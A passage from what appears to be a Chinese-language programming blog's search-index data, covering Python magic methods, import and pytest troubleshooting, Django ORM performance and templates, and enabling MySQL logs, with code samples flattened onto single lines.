p.age 如果想让添加的方法对所有实例都生效，可以绑定到类上： 1P.set_age = MethodType(set_age, None, P) 最后，slots的作用就是限制对类动态绑定的属性范围，例如： 123class P(object): __slots__ = (&quot;name&quot;, &quot;age&quot;) pass 如上，除了”name”和”age”之外的属性就不能再增加了； 注意：slots属性不会继承给子类，仅在当前类生效。 __class__ 属性 - 返回当前类对应的变量比如可以这样玩： 1234567891011class A(object): aa = 1 def get_current_class_variable(self): return self.__class__a = A()class_A_variable = a.get_current_class_variable()a2 = class_A_variable()print a2.aa 这体现了“在 Python 中一切皆对象“的哲学。 __name__属性 - 返回当前类的类名（以字符串描述）1234class A(object): passprint A.__name__ # A Referencehttp://www.liujiangblog.com/course/python/47","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】魔术方法（Magic Methods）","date":"2019-11-24T12:32:34.000Z","path":"2019/11/24/【Python】Basics-魔术方法（Magic-Methods）/","text":"Python的魔术方法一般以methodname的形式命名，如：__init__（构造方法）、 __getitem__、 __setitem__、__delitem__（调用del obj[key]时对应触发的函数）、 __len__（对类实例调用len(…)时对应触发的函数）等。 魔术方法具体有： __init__(self)：构造方法 __del__ ：析构函数，释放对象时使用 __getitem__(self,key)：返回键对应的值（按照索引获取值） __setitem__(self,key,value)：设置给定键的值（按照索引赋值） __delitem__(self,key)：删除给定键对应的元素 __len__()：对类实例调用len(…)时对应触发的函数 __cmp_： 比较运算 __call_：调用 __add__：加运算 __sub__：减运算 __mul__：乘运算 __div__：除运算 __mod__：求余运算 __pow__：幂 需要注意的是，这些成员里面有些是方法，调用时要加括号，有些是属性，调用时不需要加括号。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# coding:utf-8''' desc：尝试定义一种新的数据类型 等差数列'''class ArithmeticSequence(object): MAX = 10 def __init__(self, start=0, step=1): print 'Call function __init__' self.start = start self.step = step self.myData = &#123;&#125; i = self.start index = 0 while i &lt;= ArithmeticSequence.MAX: self.myData[index] = i i = i + self.step index += 1 # 定义获取值的方法 def __getitem__(self, key): print 'Call function __getitem__' try: return self.myData[key] except KeyError: return self.start + key * self.step # 定义赋值方法 def __setitem__(self, key, value): print 'Call function __setitem__' self.myData[key] = value # 定义获取长度的方法 def __len__(self): print 'Call function __len__' return len(self.myData) # 定义删除元素的方法 def __delitem__(self, key): print 'Call function __delitem__' del self.myData[key]s = ArithmeticSequence(1, 2)print s[3] # 9print len(s)del s[3] # 删除3这个key 输出结果： 12345Call function __init__Call function __getitem__7Call function __len__5 __init__(self) - 构造方法如果我们希望在创建某个特定类的任何一个实例时，都执行某些逻辑，我们可以将这个逻辑代码放在这个类的__init__方法中，这个逻辑通常是一些初始化工作： 1234567class Student(object): def __init__(self, name, score): self.name = name self.score = score def print_score(self): print('%s: %s' % (self.name, self.score)) 注意到__init__方法的第一个参数永远是self，表示创建的实例本身，因此，在__init__方法内部，就可以把各种属性绑定到self，因为self就指向创建的这个类实例本身。 与普通的实例方法类似，如果子类不重写 __init__，实例化子类时，Python interpreter 会自动先调用父类的__init__； 如果子类重写了 __init__，实例化子类时，则只会调用子类的 __init__，此时如果想使用父类的 __init__，可以使用super函数，如下： 12345678910111213class P(object): def __init__(self, name, score): self.name = name self.score = nameclass C(P): def __init__(self, name, score, age): # 显式地调用父类的构造函数 super(C, self).__init__(name, score) self.age = age c = C('cq', 100, 31) __new__()注意：__init__ 是实例创建之后调用的第一个方法，而 __new__ 更像构造函数，它在__init__之前被调用。 另外，__new__ 方法是一个静态方法，第一参数是cls，__new__方法必须返回创建出来的实例。 例如，用new实现单例模式： 12345678910111213class Singleton(object): def __new__(cls): # 关键在于这，每一次实例化的时候，我们都只会返回这同一个instance对象 if not hasattr(cls, 'instance'): cls.instance = super(Singleton, cls).__new__(cls) return cls.instance obj1 = Singleton()obj2 = Singleton() obj1.attr1 = 'value1'print obj1.attr1, obj2.attr1print obj1 is obj2 __del__(self) - 析构函数12345678910111213141516171819class NewClass(object): num_count = 0 def __init__(self,name): self.name = name self.__class__.num_count += 1 print name,NewClass.num_count def __del__(self): self.__class__.num_count -= 1 print \"Del\",self.name,self.__class__.num_counta = NewClass(\"a\") b = NewClass(\"b\") c = NewClass(\"c\")del adel bdel c 注意：用del删除一个对象的时候，不一定会调用__del__，只有在对象的引用计数为零时，del()才会被执行。 __iter__(self) 和 next(self)如果一个类想被用于for ... in循环，类似list或tuple那样，就必须实现一个__iter__()方法，该方法返回一个迭代对象，然后，Python的for循环就会不断调用该迭代对象的next()方法拿到循环的下一个值，直到遇到StopIteration错误时退出循环。 123456789101112class Fib(object): def __init__(self): self.a, self.b = 0, 1 # 初始化两个计数器a，b def __iter__(self): return self # 实例本身就是迭代对象，故返回自己 def next(self): self.a, self.b = self.b, self.a + self.b # 计算下一个值 if self.a &gt; 100000: # 退出循环的条件 raise StopIteration(); return self.a # 返回下一个值 __call__() - 实例可以像函数一样调用1234567891011class Student(object): def __init__(self): print '__init__ is called' def __call__(self): print '__call__ is called's = Student() # __init__ is calleds() # __call__ is called __str__(self) - 返回用户看到的字符串__repr__(self) - 返回开发者看到的字符串（用于调试）123456789# test.pyclass P(object): def __str__(self): return &quot;__str__ called&quot; def __repr__(self): return &quot;__repr__ called&quot;p = P() 可以看下str和repr的区别： 12345&gt;&gt;&gt; from test import p&gt;&gt;&gt; p__repr__ called&gt;&gt;&gt; print p__str__ called Reference https://blog.csdn.net/liweiblog/article/details/54907888 https://infohost.nmt.edu/tcc/help/pubs/python/web/special-methods.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】import 问题排查","date":"2019-11-23T10:13:09.000Z","path":"2019/11/23/【Python】import-问题排查/","text":"解决思路1使用pip list查看本项目或者系统中已经安装了未找到的模块，这里具体又分为使用了 virenv 和未使用的情况。 2直接在 terminal 中进入到当前工作文件夹（cd &lt;your target folder&gt;），测试以下 import： 12345$ pythonPython 2.7.17 (default, Oct 24 2019, 12:57:47)[GCC 4.2.1 Compatible Apple LLVM 11.0.0 (clang-1100.0.33.8)] on darwinType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt;import &lt;your target module name&gt; Python是如何寻找包的现在大家的电脑上很可能不只有一个Python，还有更多的虚拟环境，导致安装包的时候，一不小心你就忘记注意安装包的路径了。首先我们来解决找包的问题，这个问题回答起来很简单，但很多人不知道这个原理。假如你的Python解释器的路径是/bin/python，那么你启动Python交互环境或者用这个解释器运行脚本时，会默认寻找以下位置1： /lib（标准库路径） /lib/pythonX.Y/site-packages（三方库路径，X.Y是对应Python的主次版本号，如3.7, 2.6） 当前工作目录（pwd命令的返回结果） 这里如果你用的是Linux上的默认Python，就是`/usr`，如果你是自己使用默认选项编译的，就是/usr/local。从上面第二条可以看到不同次版本号的Python的三方库路径不同，如果你把Python从3.6升级到3.7那么之前装的三方库都没法用了。当然你可以整个文件夹都拷贝过去，大部分情况不会出问题。 几个有用的函数 sys.executable 当前使用的Python解释器路径 sys.path 当前包的搜索路径列表 sys.prefix 当前使用的路径 1234567&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.executable'/home/frostming/.pyenv/versions/3.7.2/bin/python'&gt;&gt;&gt; sys.path['', '/home/frostming/.pyenv/versions/3.7.2/lib/python37.zip', '/home/frostming/.pyenv/versions/3.7.2/lib/python3.7', '/home/frostming/.pyenv/versions/3.7.2/lib/python3.7/lib-dynload', '/home/frostming/.local/lib/python3.7/site-packages', '/mnt/d/Workspace/pipenv', '/home/frostming/.pyenv/versions/3.7.2/lib/python3.7/site-packages']&gt;&gt;&gt; sys.prefix'/home/frostming/.pyenv/versions/3.7.2' 使用环境变量添加搜索路径如果你的包的路径不存在上面列出的搜索路径列表里，可以把路径加到PYTHONPATH环境变量里，多个路径用:隔开（Windows用;）。 但需注意，避免把不同Python版本包的路径加到PYTHONPATH里，比如PYTHONPATH=/home/frostming/.local/lib/python2.7/site-packages，因为PYTHONPATH中的路径是优先于默认搜索路径，如果用Python 3的话会有兼容性问题。 顺便说下PATH是用来找可执行程序的搜索路径，假如你在终端中运行命令my_cmd，系统会依次扫描PATH中的路径，看my_cmd是否存在于该路径下，所以如果提示找不到程序或命令无法识别，那你就要看路径是否加到PATH里了。 Reference https://frostming.com/2019/03-13/where-do-your-packages-go","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】pytest - 运行错误","date":"2019-11-18T09:12:39.000Z","path":"2019/11/18/【Python】pytest-运行错误/","text":"Problem当执行 py.test时，报错： 123File \"/usr/local/lib/python3.7/site-packages/_pytest/tmpdir.py\", line 35, in TempPathFactory lambda p: Path(os.path.abspath(six.text_type(p)))TypeError: attrib() got an unexpected keyword argument 'convert' Solution查看 py.test 版本： 12345$ py.test --version This is pytest version 4.0.2, imported from /Working/backend/venv/lib/python2.7/site-packages/pytest.pycsetuptools registered plugins: pytest-mock-1.11.2 at /Working/backend/venv/lib/python2.7/site-packages/pytest_mock/__init__.pyc pytest-cov-2.8.1 at /Working/backend/venv/lib/python2.7/site-packages/pytest_cov/plugin.py pip list 查看当前安装的 attrs 版本，pytest 依赖于 attrs。 attrs==19.2.0引入了上面的错误，因此将 attrs 切回到 19.1.0版本： 1$ pip install attrs==19.1.0 Reference https://stackoverflow.com/questions/58189683/typeerror-attrib-got-an-unexpected-keyword-argument-convert","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】 单元测试框架 - pytest","date":"2019-11-18T08:59:32.000Z","path":"2019/11/18/【Python】-单元测试框架-pytest/","text":"一个实例1234567# content of test_sample.py def func(x): return x+1 def test_func(): assert func(3) == 5 再一个实例当需要编写多个测试样例的时候，我们可以将其放到一个测试类当中，如： 12345678910# content of test_class.pyclass TestClass: def test_one(self): x = \"this\" assert 'h' in x def test_two(self): x = \"hello\" assert hasattr(x, 'check') 我们可以通过执行测试文件的方法，执行上面的测试： 123456789101112131415$ py.test -q test_class.py.F [100%]======================================================================== FAILURES =========================================================================___________________________________________________________________ TestClass.test_two ____________________________________________________________________self = &lt;testAA.TestClass instance at 0x10dd68d40&gt; def test_two(self): x = \"hello\"&gt; assert hasattr(x, 'check')E AssertionError: assert FalseE + where False = hasattr('hello', 'check')testAA.py:8: AssertionError1 failed, 1 passed in 0.05 seconds","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Django】Django ORM - 文档整理","date":"2019-11-17T13:57:49.000Z","path":"2019/11/17/【Django】Django-ORM-文档整理/","text":"DB DocIndex for DB: https://docs.djangoproject.com/en/2.2/topics/db/ Making queries：https://docs.djangoproject.com/en/1.11/topics/db/queries/ Database access optimization - https://docs.djangoproject.com/en/1.11/topics/db/optimization/ When QuerySets are evaluated - https://docs.djangoproject.com/en/2.2/topics/db/queries/ API DocQuerySet API reference：https://docs.djangoproject.com/en/1.11/ref/models/querysets/ Performance and optimization - https://docs.djangoproject.com/en/1.11/topics/performance/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django ORM - 性能优化","date":"2019-11-17T12:22:02.000Z","path":"2019/11/17/【Django】Django-ORM-性能优化/","text":"你可以使用 python manage.py shell 来让 ORM 执行查询以玩耍： 1234$ python manage.py shell&gt;&gt;&gt; from core import models&gt;&gt;&gt; a = models.User.objects[0:5]... 如果你使用 MySQL，还可以结合General Log来实时查看 MySQL的 SQL 执行日志以进行验证（Visit 【MySQL】日志记录 for more details）。 最重要的原则: Work at the appropriate level意思就是说要在对应的 level (M V C) 做对应的事。e.g. 如果计算 court, 在最低的数据库 level 里是最快的（如果只需要知道此记录是否存在的话，用 exists() 会更快）。但要 注意: queryset 是 lazy 的，所以有时候在 higher level （例如模板）里控制 queryset 是否真的执行，说不定会更高效。 下面这段代码很好的解释了不同 level 的意思: 12345678910111213# QuerySet operation on the database# fast, because that's what databases are good atmy_bicycles.count()# counting Python objects# slower, because it requires a database query anyway, and processing# of the Python objectslen(my_bicycles)# Django template filter# slower still, because it will have to count them in Python anyway,# and because of template language overheads\\&#123;\\&#123; my_bicycles|length \\&#125;\\&#125; Lazy 的 QuerySetsBackground这段代码看上去对数据库进行了三次查找，但其实只有在代码执行 print(q) 时，才真正向数据库请求执行 SQL 语句： 12345678910111213&gt;&gt;&gt; q = Entry.objects.filter(headline__startswith=\"What\")&gt;&gt;&gt; q = q.filter(pub_date__lte=datetime.date.today())&gt;&gt;&gt; q = q.exclude(body_text__icontains=\"food\")&gt;&gt;&gt; print(q)# ps. 上边的这种多条件查询, 官方推荐这种写法:Entry.objects.filter( headline__startswith='What').exclude( pub_date__gte=datetime.date.today()).filter( pub_date__gte=datetime(2005, 1, 30)) Internally, a QuerySet can be constructed, filtered, sliced, and generally passed around without actually hitting the database. No database activity actually occurs until you do something to evaluate the queryset. Situations to let queryset to be evaluated那么问题来了 , 既然 queryset 是 lazy 的，queryset 什么时候会被 evaluate 呢（使 ORM 向 DB 真正请求执行SQL）？ Iteration，即对 Queryset 进行遍历循环的操作。 12for e in Entry.objects.all(): print(e.headline) slicing：即 Entry.objects.all()[:5], 获取 queryset 中的前五个对象，相当于 sql 中的 LIMIT 5。 值得注意的是，Slicing an unevaluated QuerySet usually returns another unevaluated QuerySet, but Django will execute the database query if you use the “step” parameter of slice syntax, and will return a list. Slicing a QuerySet that has been evaluated also returns a list. picling/caching。 repr/str：A QuerySet is evaluated when you call repr() on it. This is for convenience in the Python interactive interpreter, so you can immediately see your results when using the API interactively. len：A QuerySet is evaluated when you call len() on it. This, as you might expect, returns the length of the result list. If you only need to determine the number of records in the set (and don’t need the actual objects), it’s much more efficient to handle a count at the database level using SQL’s SELECT COUNT(*). Django provides a count() method for precisely this reason. list()：Force evaluation of a QuerySet by calling list() on it. For example: 1entry_list = list(Entry.objects.all()) bool()：Testing a QuerySet in a boolean context, such as using bool(), or, and or an if statement, will cause the query to be executed. If there is at least one result, the QuerySet is True, otherwise False. For example: 12if Entry.objects.filter(headline=&quot;Test&quot;): print(&quot;There is at least one Entry with the headline Test&quot;) 以上的情况一旦发生，就会真正执行 SQL 来查询数据库，同时生成 cache （生成的 cache 就存在这个 queryset 对象之内的）。 注意，只有以上这 7 种情况，才会生成 cache。 *举个栗子: * 123&gt;&gt;&gt; queryset = Entry.objects.all()&gt;&gt;&gt; print([p.headline for p in queryset]) # Evaluate the query set.&gt;&gt;&gt; print([p.pub_date for p in queryset]) # Re-use the cache from the evaluation, rather than evaluate the queery set again. 注意！不会 cache 的情况:Specifically, this means that limiting the queryset using an array slice or an index will not populate the cache.意思就是说 queryset [5] 和 queryset [:5] 是不会生成 cache 的。还有 exists() 和 iterator() 这样的也不会生成 cache。 举个栗子: 12345678&gt;&gt;&gt; queryset = Entry.objects.all()&gt;&gt;&gt; print queryset[5] # Queries the database&gt;&gt;&gt; print queryset[5] # Queries the database again&gt;&gt;&gt; queryset = Entry.objects.all()&gt;&gt;&gt; [entry for entry in queryset] # Queries the database&gt;&gt;&gt; print queryset[5] # Uses cache&gt;&gt;&gt; print queryset[5] # Uses cache Caching and QuerySetsEach QuerySet contains a cache to minimize database access. Understanding how it works will allow you to write the most efficient code. In a newly created QuerySet, the cache is empty. The first time a QuerySet is evaluated – and, hence, a database query happens – Django saves the query results in the QuerySet’s cache and returns the results that have been explicitly requested (e.g., the next element, if the QuerySet is being iterated over). Subsequent evaluations of the QuerySet reuse the cached results. Keep this caching behavior in mind, because it may bite you if you don’t use your QuerySets correctly. For example, the following will create two QuerySets, evaluate them, and throw them away: 12&gt;&gt;&gt; print([e.headline for e in Entry.objects.all()])&gt;&gt;&gt; print([e.pub_date for e in Entry.objects.all()]) That means the same database query will be executed twice, effectively doubling your database load. Also, there’s a possibility the two lists may not include the same database records, because an Entry may have been added or deleted in the split second between the two requests. To avoid this problem, simply save the QuerySet and reuse it: 123&gt;&gt;&gt; queryset = Entry.objects.all()&gt;&gt;&gt; print([p.headline for p in queryset]) # Evaluate the query set.&gt;&gt;&gt; print([p.pub_date for p in queryset]) # Re-use the cache from the evaluation. When QuerySets are not cachedQuerysets do not always cache their results. When evaluating only part of the queryset, the cache is checked, but if it is not populated then the items returned by the subsequent query are not cached. Specifically, this means that limiting the queryset using an array slice or an index will not populate the cache. For example, repeatedly getting a certain index in a queryset object will query the database each time: 123&gt;&gt;&gt; queryset = Entry.objects.all()&gt;&gt;&gt; print(queryset[5]) # Queries the database&gt;&gt;&gt; print(queryset[5]) # Queries the database again However, if the entire queryset has already been evaluated, the cache will be checked instead: 1234&gt;&gt;&gt; queryset = Entry.objects.all()&gt;&gt;&gt; [entry for entry in queryset] # Queries the database&gt;&gt;&gt; print(queryset[5]) # Uses cache&gt;&gt;&gt; print(queryset[5]) # Uses cache Here are some examples of other actions that will result in the entire queryset being evaluated and therefore populate the cache: 1234&gt;&gt;&gt; [entry for entry in queryset]&gt;&gt;&gt; bool(queryset)&gt;&gt;&gt; entry in queryset&gt;&gt;&gt; list(queryset) 一些结论1 显式地声明你需要的字段123&gt;&gt;&gt; a = models.User.objects.all()&gt;&gt;&gt; a[0].id1 事实上，当执行到 a[0].id 时，以下 SQL 会被执行： 1SELECT `core_user`.`id`, `core_user`.`name`, `core_user`.`password`, `core_user`.`salt`, `core_user`.`join_time`, `core_user`.`last_login_time`, `core_user`.`type` FROM `core_user` LIMIT 1 因此，使用 values_list() 或者 values()显式地指定你需要的字段。 假设只需要 id 字段的话，可以用 values_list (&#39;id&#39;, flat=True)。 2 当判断某条数据是否存在时，尽量使用 exists()当执行以下代码时： 1&gt;&gt;&gt;test = models.User.objects.filter(id=1).exists() 以下SQL会被立刻触发执行： 1SELECT (1) AS `a` FROM `core_user` WHERE `core_user`.`id` = 1 LIMIT 1 而且，当判断某条数据是否存在时，尽可能的使用primary key，比如： 123entry = Entry.objects.get(pk=123)if some_queryset.filter(pk=entry.pk).exists(): print(\"Entry contained in queryset\") 上面的方式明显会快于下面的方式： 1234entry = User(1, ...)some_queryset = models.User.objects.all()if entry in some_queryset: # evaluate the sql here print(\"Entry contained in QuerySet\") 因为，下面的代码其实会将整个 User 都读取出来： 1SELECT `core_user`.`id`, `core_user`.`name`, `core_user`.`password`, `core_user`.`salt`, `core_user`.`join_time`, `core_user`.`last_login_time`, `core_user`.`type` FROM `core_user` And to find whether a queryset contains any items: 12if some_queryset.exists(): print(&quot;There is at least one object in some_queryset&quot;) Which will be faster than: 12if some_queryset: print(&quot;There is at least one object in some_queryset&quot;) … but not by a large degree (hence needing a large queryset for efficiency gains). 因为some_queryset.exists()其实会触发如下 SQL： 1SELECT (1) AS `a` FROM `core_user` WHERE `core_user`.`id` = 1 LIMIT 1 而后者会触发一个 SQL，这个 SQL 会将把 filter 中的条件映射到 where 语句中，然后把所有满足条件的数据都从 DB中读出来。 Additionally, if a some_queryset has not yet been evaluated, but you know that it will be at some point, then using some_queryset.exists() will do more overall work (one query for the existence check plus an extra one to later retrieve the results) than simply using bool(some_queryset), which retrieves the results and then checks if any were returned. 3 获取行的数量时，使用QuerySet.count()If you only want the count, rather than doing len(queryset). 4 直接使用外键If you only need a foreign key value, use the foreign key value that is already on the object you’ve got, rather than getting the whole related object and taking its primary key. i.e. do: 1entry.blog_id instead of: 1entry.blog.id 5 批量插入When creating objects, where possible, use the bulk_create() method to reduce the number of SQL queries. For example: 1234Entry.objects.bulk_create([ Entry(headline=&apos;This is a test&apos;), Entry(headline=&apos;This is only a test&apos;),]) …is preferable to: 12Entry.objects.create(headline=&apos;This is a test&apos;)Entry.objects.create(headline=&apos;This is only a test&apos;) Note that there are a number of caveats to this method, so make sure it’s appropriate for your use case. This also applies to ManyToManyFields, so doing: 1my_band.members.add(me, my_friend) …is preferable to: 12my_band.members.add(me)my_band.members.add(my_friend) …where Bands and Artists have a many-to-many relationship. 一些测试Test1 123&gt;&gt;&gt; a = models.User.objects.values(\"id\")[0:5]&gt;&gt;&gt; for i in range(0,2):... a[i][\"id\"] SQL 执行： 122019-11-17T13:15:18.454675Z 35 Query SELECT `core_user`.`id` FROM `core_user` LIMIT 12019-11-17T13:15:18.456044Z 35 Query SELECT `core_user`.`id` FROM `core_user` LIMIT 1 OFFSET 1 结论 执行完 a = models.User.objects.values(&quot;id&quot;)[0:5] 语句后，并没有触发执行 SQL 语句； 每次进入执行 a[i][&quot;id&quot;]时，都会真正触发执行一次 SQL 语句。 Test2对于 Entry.objects.all():、 Entry.objects.filter(id=1)、切片（models.User.objects.all().values(&quot;id&quot;)[0:1]），只有到对 queryset 对象开始进行遍历的时候，ORM 才会请求 DB 触发执行 SQL。 Test3 - Debug 模式下的特殊情况在断点调试模式下，由于每次为一个变量赋值后，都要显示出该变量的内容，这就导致QuerySets 的 Lazy Evaluation永远不会被触发。比如， 1234def test(): users = models.User.objects.all() user = users[0] print \"test\" 按照上面的分析，只有执行到 user = users[0] 时，才会触发执行 SQL 语句。但是，在断点调试模式下，需要显示出 users 变量的值是什么，因此，在执行完 users = models.User.objects.all() 时，SQL 语句就会被触发执行。 以下为 SQL 执行日志： 123452019-11-24T04:39:21.763123Z 46 Connect root@localhost on task2 using TCP/IP2019-11-24T04:39:21.773622Z 46 Query SET AUTOCOMMIT = 02019-11-24T04:39:21.776080Z 46 Query SET SQL_AUTO_IS_NULL = 02019-11-24T04:39:21.783327Z 46 Query SET AUTOCOMMIT = 12019-11-24T04:39:21.789287Z 46 Query SELECT `core_user`.`id`, `core_user`.`name`, `core_user`.`password`, `core_user`.`salt`, `core_user`.`join_time`, `core_user`.`last_login_time`, `core_user`.`type` FROM `core_user` LIMIT 21 一些分析方法django-debug-toolbar原生的 explain 方法123456&gt;&gt;&gt; print(Blog.objects.filter(title='My Blog').explain(verbose=True))Seq Scan on public.blog (cost=0.00..35.50 rows=10 width=12) (actual time=0.004..0.004 rows=10 loops=1) Output: id, title Filter: (blog.title = 'My Blog'::bpchar)Planning time: 0.064 msExecution time: 0.058 ms connection.queries 方法可以利用这两两句代码来分析你的代码的 sql 执行情况和花费时间: 1234567from django.db import connectionconnection.queries&gt;&gt; [&#123;'sql': 'SELECT polls_polls.id, polls_polls.question, polls_polls.pub_date FROM polls_polls', 'time': '0.002'&#125;]from django.db import reset_queriesreset_queries() Reference Performance and optimization - https://docs.djangoproject.com/en/1.11/topics/performance/ Database access optimization - https://docs.djangoproject.com/en/1.11/topics/db/optimization/ When QuerySets are evaluated - https://docs.djangoproject.com/en/2.2/topics/db/queries/ https://docs.djangoproject.com/en/1.11/ref/models/querysets/#when-querysets-are-evaluated exists() - https://docs.djangoproject.com/en/1.11/ref/models/querysets/#django.db.models.query.QuerySet.exists https://changchen.me/blog/20170503/django-performance-and-optimisation/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django ORM - 使 DB Schema 生效","date":"2019-11-17T11:39:51.000Z","path":"2019/11/17/【Django】Django-ORM-使-DB-Schema-生效/","text":"当通过 Model 声明完表结构后，Django 可以自动将 Model 声明转换成DB Schema，进而自动写入 DB 中。 在&gt;=1.7 的 Django 中，可以使用以下方法来生成 DB schema： 12$ python manage.py makemigrations$ python manage.py migrate The makemigrations command looks at all your available models and creates migrations for whichever tables don’t already exist. migrate runs the migrations and creates tables in your database, as well as optionally providing much richer schema control. 在 1.7 之前的版本，使用： 1$ python manage.py syncdb Reference https://docs.djangoproject.com/en/2.2/topics/migrations https://stackoverflow.com/questions/20250123/django-error-unknown-command-makemigrations","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】使用 Template","date":"2019-11-17T08:28:15.000Z","path":"2019/11/17/【Django】使用-Template/","text":"在复杂的 Django Project 中，可以会存在多个 Django App，如果科学地管理我们的 HTML页面非常重要。 步骤虽然我们有多个Django App，但是templates根文件夹与Django Project应该是一对一的关系，而不是在每个 django App 中都有一个属于这个 App 自己的templates根文件夹。 配置 templates 的路径在Django Project 的 settings.py中指定 templates： 12345678910111213141516TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates')] , 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,] 添加 HTML模板和 HTML 页面在项目的根目录下创建一个 templates 文件夹文件夹： 1$ mkdir templates 在 templates 文件夹中定义一个 base.html： 123456789101112&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&#123;% block title %&#125;base&#123;% endblock %&#125;&lt;/title&gt; &lt;link href=\"&#123;% static 'test.js' %&#125;\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt;&#123;% block content %&#125;&#123;% endblock %&#125;&lt;/body&gt;&lt;/html&gt; 在 templates 文件夹中定义一个 a.html： 1234567&#123;% extends 'base.html' %&#125;&#123;% load staticfiles %&#125;&#123;% block title %&#125;a's title&#123;% endblock %&#125;&#123;% block content %&#125;a's body&#123;% endblock %&#125; 在 templates 文件夹中定义一个 a.html： 1234567&#123;% extends 'base.html' %&#125;&#123;% load staticfiles %&#125;&#123;% block title %&#125;b's title&#123;% endblock %&#125;&#123;% block content %&#125;b's body&#123;% endblock %&#125; 添加路由配置在 settings.py 中定义全局路由： 123456from django.conf.urls import url, includeurlpatterns = [ url(r'^hello/', include('hello.urls')), url(r'^hello2/', include('hello2.urls')),] 在 hello/urls.py 中定义hello App 的路由： 1234567from django.conf.urls import urlfrom hello import viewsurlpatterns = [ url(r'^a/$', views.a),] 在 hello2/urls.py 中定义hello2 App 的路由： 1234567from django.conf.urls import urlfrom hello2 import viewsurlpatterns = [ url(r'^b/$', views.b),] 添加Views定义 hello 的 views.py： 123456789# -*- coding: utf-8 -*-from __future__ import unicode_literalsfrom django.http import HttpResponsefrom django.shortcuts import render# Create your views here.def a(request): return render(request, 'a.html') 定义 hello2 的 views.py： 12345678# -*- coding: utf-8 -*-from __future__ import unicode_literalsfrom django.shortcuts import render# Create your views here.def b(request): return render(request, 'b.html') 文件结构此时的文件结构： 1234567891011121314$ tree├── TestDjango│ ├── ...├── hello│ ├── ...├── hello2│ ├── ...├── templates ├── base.html ├── a.html └── b.html├── static│ └── test.js└── ... 当访问 http://127.0.0.1:8001/hello/a/ 时：","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【MySQL】日志记录","date":"2019-11-17T05:50:19.000Z","path":"2019/11/17/【MySQL】日志记录/","text":"MySQL 日志文件有一下几种： 错误日志（error log）：It contains information about errors that occur while the server is running (also server start and stop) 一般日志（general log）：This is a general record of what mysqld is doing (connect, disconnect, queries) 慢查询日志（slow query log）：Ιt consists of “slow” SQL statements (as indicated by its name). 二进制日志 binlog 重做日志 redo.log 回滚日志 undo.log Error Log查看Error Log目录123456MariaDB [(none)]&gt; show variables like &quot;log_error&quot;;+---------------+------------------------------+| Variable_name | Value |+---------------+------------------------------+| log_error | /var/log/mariadb/mariadb.log |+---------------+------------------------------+ Enable Error LogGo to mysql conf file (/etc/mysql/my.cnf) and add following lines 12345[mysqld_safe]log_error=/var/log/mysql/mysql_error.log[mysqld]log_error=/var/log/mysql/mysql_error.log 如果想修改 Error Log 的路径，也可以直接修改/etc/mysql/my.cnf。 General LogGeneral Log 记录了服务器接收到的每一个查询或是命令。 无论这些查询或是命令是否正确甚至是否包含语法错误，general log 都会将其记录下来 ，记录的格式为 {Time ，Id ，Command，Argument }。 也正因为mysql服务器需要不断地记录日志，开启General log会产生不小的系统开销。 因此，MySQL 默认是把General log关闭的。 我们可以通过修改MySQL全局变量来开启General log功能或是更改日志存放路径。 查看 General Log 是否打开查看 MySQL 是否启用了查询日志: show global variables like “%genera%”; 12345678910mysql&gt; show global variables like \"%genera%\";+----------------------------------------+----------------------+| Variable_name | Value |+----------------------------------------+----------------------+| auto_generate_certs | ON || general_log | OFF || general_log_file | /tmp/mysql_query.log || sha256_password_auto_generate_rsa_keys | ON |+----------------------------------------+----------------------+4 rows in set (0.00 sec) 我这里是配置了日志输出文件：/tmp/mysql_query.log，并且日志功能关闭 Enable General LogGo to mysql conf file (/etc/mysql/my.cnf) and add following lines 12general_log_file = /var/log/mysql/mysql.loggeneral_log = 1 MySQL打开general log日志后，所有的查询语句都可以在general log文件中输出，如果打开，文件会非常大，建议调试的时候打开，平时关闭。 开启方法查看当前状态12345678mysql&gt; show variables like &apos;general%&apos;;+------------------+--------------------------------+| Variable_name | Value |+------------------+--------------------------------+| general_log | OFF || general_log_file | /data/mysql/data/localhost.log |+------------------+--------------------------------+2 rows in set (0.00 sec) 开启方法 